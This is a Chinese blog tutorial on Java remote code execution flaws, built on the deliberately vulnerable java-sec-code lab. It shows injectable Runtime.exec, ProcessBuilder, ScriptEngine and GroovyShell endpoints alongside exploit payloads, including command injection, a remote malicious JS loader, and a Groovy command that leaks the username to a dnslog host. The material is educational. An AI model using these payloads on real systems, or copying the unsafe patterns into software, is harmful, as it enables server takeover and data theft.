
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/k1115h0t/p/18914874" title="发布于 2025-06-06 19:28">
    <span role="heading" aria-level="2">Java安全_RCE漏洞</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>[!NOTE]</p>
<p>本次学习使用开源项目：<br>
<a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SQLI.java" target="_blank" rel="noopener nofollow">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SQLI.java</a></p>
<p>使用工具：<br>
浏览器</p>
<p>IDEA</p>
</blockquote>
<p></p><div class="toc"><div class="toc-container-header">目录</div><ul><li><a href="#-什么是-rce-漏洞" rel="noopener nofollow">✅ 什么是 RCE 漏洞？</a></li><li><a href="#-典型攻击场景" rel="noopener nofollow">🎯 典型攻击场景</a><ul><li><ul><li><a href="#命令注入" rel="noopener nofollow">命令注入</a></li></ul></li></ul></li><li><a href="#以下为集中典型rce漏洞代码场景" rel="noopener nofollow">🤞以下为集中典型RCE漏洞代码场景</a></li><li><a href="#1runtime" rel="noopener nofollow">1、Runtime</a></li><li><a href="#为什么runtimegetruntime无法直接执行dir而是cmd-c-dir" rel="noopener nofollow"><strong>为什么Runtime.getRuntime无法直接执行<code>dir</code>，而是<code>cmd /c dir</code>?</strong></a></li><li><a href="#2processbuilder" rel="noopener nofollow">2、ProcessBuilder</a></li><li><a href="#3scriptenginemanager" rel="noopener nofollow">3、ScriptEngineManager</a></li><li><a href="#4groovy" rel="noopener nofollow">4、Groovy</a></li></ul></div><p></p>
<h1 id="-什么是-rce-漏洞">✅ 什么是 RCE 漏洞？</h1>
<p>RCE（远程代码执行）指的是：</p>
<blockquote>
<p>攻击者利用服务器应用程序中的某些漏洞，将恶意代码传输到服务器，并在服务器上<strong>以服务器权限执行这些代码</strong>。</p>
</blockquote>
<p>简而言之，就是攻击者“远程控制服务器执行命令”，可以做几乎<strong>任何操作</strong>：</p>
<ul>
<li>读写文件</li>
<li>远程控制</li>
<li>添加后门</li>
<li>窃取数据库数据</li>
<li>横向渗透、内网打点</li>
</ul>
<h1 id="-典型攻击场景">🎯 典型攻击场景</h1>
<p>以下是几种常见导致 RCE 漏洞的场景：</p>
<hr>
<h3 id="命令注入">命令注入</h3>
<p>Java 中使用 <code>Runtime.exec()</code> 或 <code>ProcessBuilder</code> 时拼接了用户输入：</p>
<pre><code class="language-java">String cmd = "ping " + userInput;
Runtime.getRuntime().exec(cmd);
</code></pre>
<p>如果用户输入的是：</p>
<pre><code class="language-cmd">127.0.0.1 &amp;&amp; whoami
</code></pre>
<p>最终执行命令为：</p>
<pre><code class="language-cmd">ping 127.0.0.1 &amp;&amp; whoami
</code></pre>
<p>服务器会在 ping 后执行 <code>whoami</code>，泄露系统身份。</p>
<h1 id="以下为集中典型rce漏洞代码场景">🤞以下为集中典型RCE漏洞代码场景</h1>
<h1 id="1runtime">1、Runtime</h1>
<pre><code class="language-java">@RequestMapping("/rce")
public class Rce {
    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }
}
</code></pre>
<p>通过查看代码发现，进入函数执行的URi为 <code>/rce/runtime/exec</code></p>
<pre><code class="language-java">@RequestMapping("/rce")
public class Rce {
    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
</code></pre>
<p>传入参数为cmd，因此构造payload<code>http://127.0.0.1:8081/rce/runtime/exec?cmd=cmd /c dir</code></p>
<p>这段代码<strong>完全没有对用户传入的 <code>cmd</code> 参数做任何校验或过滤</strong>，使得攻击者可以通过浏览器或 HTTP 客户端构造如下 URL，实现远程命令执行</p>
<pre><code class="language-java">public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(cmd);
        }
</code></pre>
<h1 id="为什么runtimegetruntime无法直接执行dir而是cmd-c-dir"><strong>为什么Runtime.getRuntime无法直接执行<code>dir</code>，而是<code>cmd /c dir</code>?</strong></h1>
<p><u><em><strong>理解这个很重要</strong></em></u></p>
<p><u><em>Runtime.getRuntime.exec的部分调用链</em></u></p>
<pre><code class="language-java">Runtime.getRuntime.exec()
	java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)
		java.lang.ProcessBuilder#start
			java.lang.SecurityManager#checkExec
    			java.lang.ProcessImpl#ProcessImpl
</code></pre>
<p>其中如下<code>java.lang.ProcessBuilder#start</code>部分代码如下</p>
<pre><code class="language-java"> public Process start() throws IOException {
        // Must convert to array first -- a malicious user-supplied
        // list might try to circumvent the security check.
        String[] cmdarray = command.toArray(new String[command.size()]);
        cmdarray = cmdarray.clone();

        for (String arg : cmdarray)
            if (arg == null)
                throw new NullPointerException();
        // Throws IndexOutOfBoundsException if command is empty
        String prog = cmdarray[0];  //这里会找到["cmd","/c","dir"]第一个元素，也就是cmd，然后丢给security.checkExec(prog);
        SecurityManager security = System.getSecurityManager();
        if (security != null)
            security.checkExec(prog);
</code></pre>
<p>其中的<code>java.lang.SecurityManager#checkExec</code>如下</p>
<pre><code class="language-java">    public void checkExec(String cmd) {
        File f = new File(cmd);
        if (f.isAbsolute()) {
            checkPermission(new FilePermission(cmd,
                SecurityConstants.FILE_EXECUTE_ACTION));
        } else {
            checkPermission(new FilePermission("&lt;&lt;ALL FILES&gt;&gt;",
                SecurityConstants.FILE_EXECUTE_ACTION));
        }
    }
</code></pre>
<p>其中的<code>java.lang.ProcessImpl#ProcessImpl</code>部分代码如下</p>
<pre><code class="language-java">        if (allowAmbiguousCommands &amp;&amp; security == null) {
            // Legacy mode.

            // Normalize path if possible.
            String executablePath = new File(cmd[0]).getPath();

            // No worry about internal, unpaired ["], and redirection/piping.
            if (needsEscaping(VERIFICATION_LEGACY, executablePath) )
                executablePath = quoteString(executablePath);

            cmdstr = createCommandLine(
                //legacy mode doesn't worry about extended verification
                VERIFICATION_LEGACY,
                executablePath,
                cmd);
        } else {
            String executablePath;
            try {
                executablePath = getExecutablePath(cmd[0]);
            }
</code></pre>
<p>经过分析可以知道，<code>Runtime.getRuntime().exec(cmd)</code>的命令执行路径大致为</p>
<pre><code class="language-java">Runtime --&gt; ProcessBuilder --&gt; ProcessImpl
</code></pre>
<p>其中，<strong>命令<code>cmd /c dir</code>会被转为List数组</strong>，其中数组的<strong>第一个元素<code>cmd</code>为可执行文件的名称</strong>，最终将可执行文件名称交给<strong>ProcessBuilder</strong>进行下一步调用</p>
<p>那么可以得出结论：第一个元素的名字必须能在<code>系统变量Path</code>中找到，这就是为什么不能直接使用dir等命令的原因了</p>
<p>如系统变量Path中有Bandizip的目录，那么传入<code>http://localhost:8081/rce/runtime/exec?cmd=Bandizip</code>，成功执行Bandizip</p>
<p><img src="https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192712946-1706728764.png" alt="" loading="lazy"></p>
<h1 id="2processbuilder">2、ProcessBuilder</h1>
<p>ProcessBuilder顾名思义为进程构建器，函数接收包含一个或多个String类型元素的List，或者String类型的可变参数</p>
<p>数组的<strong>第一个</strong>元素为要执行的应用程序的名称，后续元素为<strong>执行时的参数</strong></p>
<p>在Windows中，默认第一个参数为cmd，Linux中则需要手动指定</p>
<pre><code class="language-java">@RequestMapping("/rce")
public class Rce {
@GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
           // String[] arrCmd = {"/bin/sh", "-c", cmd};  //linux
            String[] arrCmd = {cmd};                 //windows,windos下无需指定
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;
            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }
}
</code></pre>
<p>通过查看代码发现，命令执行部分如下，且发现从cmd参数传入，一直到processBuilder.start()都没有对执行的命令进行任何过滤</p>
<p>因此，可以通过控制传入cmd参数执行攻击者想要的任何命令</p>
<pre><code class="language-java">        try {
           // String[] arrCmd = {"/bin/sh", "-c", cmd};  //linux
            String[] arrCmd = {cmd};                 //windows,windos下无需指定
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
</code></pre>
<p>查看注释上的路由，构造URi为<code>http://localhost:8081/rce/ProcessBuilder?cmd=whoami</code></p>
<p>成功执行命令</p>
<p><img src="https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192725926-640251246.png" alt="" loading="lazy"></p>
<h1 id="3scriptenginemanager">3、ScriptEngineManager</h1>
<p><u><em><strong>存在漏洞的代码</strong></em></u></p>
<pre><code class="language-java">    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);//启动javascript引擎
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }
</code></pre>
<p>加载一个JS引擎</p>
<pre><code class="language-java">        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);//启动javascript引擎
</code></pre>
<p>使用JS引擎执行命令，这里使用<code>load()</code>从远程加载JS文件</p>
<p>所以我们可以把恶意payload写在远程js文件中，经由JS引擎加载之后执行恶意命令，进而实现RCE</p>
<p><u><em><strong>远程恶意JS模板</strong></em></u></p>
<pre><code class="language-js">function mainOutput() {
    var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");
}
var a = mainOutput(); 
</code></pre>
<p><u><em><strong>注意！！！：根据不同的Script引擎，可能会有不同的执行效果</strong></em></u></p>
<p>这里起一个python simple httpserver，然后放入恶意js文件，然后构造一个恶意Payload<code>http://localhost:8081/rce/jscmd?jsurl=http://127.0.0.1:9090/1.js</code>，成功执行恶意payload</p>
<p><img src="https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192735436-1922201125.png" alt="" loading="lazy"></p>
<h1 id="4groovy">4、Groovy</h1>
<p>Groovy 是一种基于 <strong>Java 平台</strong>的 <strong>动态脚本语言</strong>，语法简洁、灵活，兼容 Java，并能与 Java 无缝集成。可以把 Groovy 看成是 “更轻量、更灵活的 Java”。</p>
<p>如果不安全的Groovy接口由用户可控，那么就很容易造成RCE漏洞</p>
<p><u><em>示例代码</em></u></p>
<pre><code class="language-java">    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }
</code></pre>
<p>上述代码开启了一个GroovyShell，并且执行的参数用户可控</p>
<p>因此可以构造Payload执行Groovy命令，构造</p>
<pre><code class="language-groovy">def cmd="cmd /c ping %USERNAME%.your.dnslog.cn"
cmd.execute()
</code></pre>
<p>经过URL编码后为</p>
<pre><code class="language-shell">def%20cmd%3D%22cmd%20/c%20ping%20%25USERNAME%25.your.dnslog.cn%22%0Acmd.execute%28%29
</code></pre>
<p>最终成功触发DNS回显验证</p>
<p><img src="https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192744740-1059375887.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.8679501792835648" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-06-06 19:30">2025-06-06 19:28</span>&nbsp;
<a href="https://www.cnblogs.com/k1115h0t">k1115h0t</a>&nbsp;
阅读(<span id="post_view_count">35</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18914874);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18914874', targetLink: 'https://www.cnblogs.com/k1115h0t/p/18914874', title: 'Java安全_RCE漏洞' })">举报</a>
</div>
        